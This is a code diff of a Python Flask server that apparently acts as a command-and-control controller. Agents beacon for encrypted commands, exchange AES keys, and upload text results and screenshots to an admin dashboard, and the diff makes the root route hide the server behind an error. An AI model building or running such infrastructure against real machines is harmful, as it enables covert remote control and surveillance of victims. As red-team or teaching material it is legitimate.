@@ -6,6 +6,7 @@ from paths import DASHBOARD_HTML, SCREENSHOT, OUTPUT_IMG,SERVER_LOG
 from flask import Flask, jsonify, request, render_template_string
 from loguru import logger
 from log_setup import setup_logging
+from collections import deque
 
 app = Flask(__name__)
 users_in_server = {}
@@ -19,8 +20,10 @@ def home():
     logger.debug(f"the agent id is: {request.headers.get('Agent-Id')}")
     data = request.get_json(silent=True)
     logger.debug(data)
-    return "Hello World! Your Flask HTTP server is running."
+    return 404, "ERROR"
 
+
+#-------------------------------
 #the main route for client beacon
 @app.route('/getkeys', methods=['GET'])
 def get_keys():
@@ -33,35 +36,22 @@ def get_keys():
         users_in_server[agent_id] = {'aes_key':"" , 'ip_addr':f"{request.remote_addr}",
                   "is_encrypted":False , 'last_seen':f'{str(datetime.datetime.now())}'}
     logger.debug(request)
-    logger.debug(request.data)
-    logger.debug(request.headers)
-    data = request.get_json(silent=True)
     #if there is  something at queue but still not encrypted - it may be public key / N
-
     if users_in_server[agent_id]['is_encrypted'] == False:
         logger.debug("1")
         return jsonify({"public_key": str(public_key), "N": str(N)}), 200
-   # elif q.qsize() == 0 and users_in_server[agent_id]['is_encrypted'] == False:
-     #   return "empty", 200
-
 
 @app.route('/getkeys', methods=['POST'])
-def handle_json2():
+def agent_send_aes_key():
     #the agent sending content
-    # Parse incoming JSON payload
-    logger.info("the agent sent his aes key")
     agent_id = request.headers.get('Agent-Id')
     data = request.get_json(silent=True)
-    logger.debug(request)
-    logger.debug(request.get_data())
-    logger.debug(request.method)
-    logger.debug(request.headers)
+
     #we recieve the aes key int str, but is actually an int which represent bytes!!
     encrypted_aes = data.get('aes_key_int')
     #decrypt the aes key by the int version
     aes_key_by_client = encryptions.decrypt_with_private_key(N,int(encrypted_aes),privateKey)
-    aes_key_str = aes_key_by_client.to_bytes(16,'little')
-    # we save the aes key in bytes
+
     users_in_server[agent_id]['aes_key'] = str(aes_key_by_client)
     users_in_server[agent_id]['is_encrypted'] = 'True'
     if not data:
@@ -69,32 +59,53 @@ def handle_json2():
     else:
         return jsonify({"msg":"success"}),200
 
+#-------------------------------
+"""
+all the commands system is in the /getcommands
+agent becons for getting commands - through GET
+agent send the data by the commands through POST
+"""
+@app.route('/getcommands', methods=['GET'])
+# if there is something at the queue but encrypted - it has to be command!
+def handle_commands_by_client():
+    agent_id = request.headers.get('Agent-Id')
+    #if i have command at the queue and encryption is valid:
+    if q.qsize() != 0 and users_in_server[agent_id]['is_encrypted'] == 'True':
+        logger.debug("avilavle command in queue - send it to client")
+        command_for_client = q.get()
+        #should make encryption function
+        time.sleep(3)
+        #----------
+        #call to the functions:
+        iv,encrypted_command = encrypt_command_with_aes(command_for_client,users_in_server[agent_id]['aes_key'])
+        iv_base64 = encryptions.base_64_encoder(iv)
+        encrypted_command_base64=encryptions.base_64_encoder(encrypted_command)
+        #return a strings which is actually an int;s represting of the bytes
+        return jsonify({'iv': iv_base64, 'msg': encrypted_command_base64}),200
+    elif q.qsize() == 0 and users_in_server[agent_id]['is_encrypted'] == 'True':
+        errmsg = "nothing"
+        iv, encrypted_command = encrypt_command_with_aes(errmsg, users_in_server[agent_id]['aes_key'])
+        iv_base64 = encryptions.base_64_encoder(iv)
+        encrypted_command_base64 = encryptions.base_64_encoder(encrypted_command)
+        logger.info("the queue is empty")
+        return jsonify({'iv': iv_base64, 'msg': encrypted_command_base64}),200
+
 
 @app.route('/getcommands', methods=['POST'])
-def handle_json3():
+def handle_agent_data():
     # Parse incoming JSON payload
     agent_id = request.headers.get('Agent-Id')
     data = request.get_json(silent=True)
-    content = (data["content"])
-    base_64_decode = base64.b64decode(content)
-    iv = int(data["iv"])
-    logger.debug(request)
-    logger.debug(request.get_data())
-    logger.debug(request.method)
-    logger.debug(request.headers)
-    logger.debug(data)
-
-    iv_byte_length = (iv.bit_length() + 7) // 8
-    #content_byte_length = (content.bit_length()+7)//8
-    bytes_iv = iv.to_bytes(iv_byte_length,'little')
-    #bytes_content = content.to_bytes(content_byte_length,'little')
+    content_base64_decoded = base64.b64decode(data["content"].encode('utf-8') )
+    iv_base64_decoded = base64.b64decode(data["iv"].encode('utf-8'))
 
     aes_key_by_me = int(users_in_server[agent_id]['aes_key'])
-    aes_key_by_me_bytes_length = (aes_key_by_me.bit_length() + 7 ) // 8
     bytes_key = aes_key_by_me.to_bytes(16,'little')
 
-    decrypted_content = encryptions.aes_decryption(base_64_decode,bytes_key,bytes_iv)
+    decrypted_content = encryptions.aes_decryption(content_base64_decoded,bytes_key,iv_base64_decoded)
     unpaded_decrypted_content = encryptions.aes_unpadder(decrypted_content)
+
+    #check if agent sent an image
     if unpaded_decrypted_content.startswith(b'\x89\x50\x4E\x47\x0D\x0A\x1A\x0A'):
         URL_PIC = str(OUTPUT_IMG)
         try:
@@ -106,11 +117,10 @@ def handle_json3():
         except ConnectionResetError:
             logger.debug("Client closed connection")
     else:
-        logger.debug("the decrypted content is:\n")
-        logger.debug(unpaded_decrypted_content.decode('utf-8'))
+        #agent sent text data
         decoded_text = unpaded_decrypted_content.decode('utf-8')
         logger.debug(f"the full content is {unpaded_decrypted_content}and type is {type(unpaded_decrypted_content)}")
-        admin_responses.insert(0, {"agent": agent_id, "time": str(datetime.datetime.now().strftime("%H:%M:%S")),
+        agent_responses.appendleft({"agent": agent_id, "time": str(datetime.datetime.now().strftime("%H:%M:%S")),
                                    "data": decoded_text})
     if not data:
         return jsonify({"error": "No JSON data provided"}), 400
@@ -129,61 +139,26 @@ def encrypt_command_with_aes(command: str, aes_key: str) -> bytes:
     return iv, encrypted_command
 
 
-
-
-@app.route('/getcommands', methods=['GET'])
-# if there is something at the queue but encrypted - it has to be command!
-def handle_commands_by_client():
-    agent_id = request.headers.get('Agent-Id')
-    #if i have command at the queue and encryption is valid:
-    if q.qsize() != 0 and users_in_server[agent_id]['is_encrypted'] == 'True':
-        command_for_client = q.get()
-        #should make encryption function
-        logger.debug("avilavle command in queue - send it to client")
-        time.sleep(3)
-        #----------
-        #call to the functions:
-        iv,encrypted_command = encrypt_command_with_aes(command_for_client,users_in_server[agent_id]['aes_key'])
-        iv_base64 = encryptions.base_64_encoder(iv)
-        encrypted_command_base64=encryptions.base_64_encoder(encrypted_command)
-        #return a strings which is actually an int;s represting of the bytes
-        return jsonify({'iv': iv_base64, 'msg': encrypted_command_base64}),200
-    elif q.qsize() == 0 and users_in_server[agent_id]['is_encrypted'] == 'True':
-        logger.info("3")
-        errmsg = "nothing"
-        iv, encrypted_command = encrypt_command_with_aes(errmsg, users_in_server[agent_id]['aes_key'])
-        iv_base64 = encryptions.base_64_encoder(iv)
-        encrypted_command_base64 = encryptions.base_64_encoder(encrypted_command)
-        logger.info("the queue is empty")
-        return jsonify({'iv': iv_base64, 'msg': encrypted_command_base64}),200
-
-
 @app.route('/admin', methods=['GET'])
 def admin_ui():
-    # פותח את קובץ ה-HTML של הממשק
-    with open(os.path.join(DASHBOARD_HTML), 'r',
-        encoding='utf-8') as f:        return render_template_string(f.read())
+    with open(os.path.join(DASHBOARD_HTML), 'r',encoding='utf-8') as f:
+        return render_template_string(f.read())
 
 @app.route('/api/status', methods=['GET'])
 def get_status():
     image_data = None
-    # 1. בודקים אם קובץ התמונה ששמרת ב-Socket אכן קיים
     if OUTPUT_IMG.exists():
         try:
-            # 2. קוראים את הקובץ במצב בינארי (rb)
             with open(OUTPUT_IMG, 'rb') as img_file:
-                # 3. הופכים את הביטים למחרוזת Base64
                 b64_string = base64.b64encode(img_file.read()).decode('utf-8')
-                # 4. מרכיבים את ה-Data URL שהדפדפן יודע לקרוא
                 image_data = f"data:image/png;base64,{b64_string}"
         except Exception as e:
             logger.error(f"Error reading image: {e}")
 
-    # 5. מחזירים את ה-JSON, עם התוספת של התמונה
     return jsonify({
         "agents": users_in_server,
         "queue_size": q.qsize(),
-        "responses": admin_responses[:10],
+        "responses": list(agent_responses)[:10],
         "latest_image": image_data
     }), 200
 
@@ -194,7 +169,7 @@ def send_command_api():
     agent_id = data.get('agent_id')
 
     if command and agent_id in users_in_server:
-        q.put(command)  # מכניס לתור הקיים
+        q.put(command)
         return jsonify({"status": "Command added to queue"}), 200
     return jsonify({"error": "Invalid command or agent"}), 400
 
@@ -247,8 +222,8 @@ def main():
 
     # Initialize the Flask application
     global users_in_server
-    global admin_responses
-    admin_responses = []
+    global agent_responses
+    agent_responses = deque(maxlen=50)
 
     setup_logging(str(SERVER_LOG))
     args = parse_args()
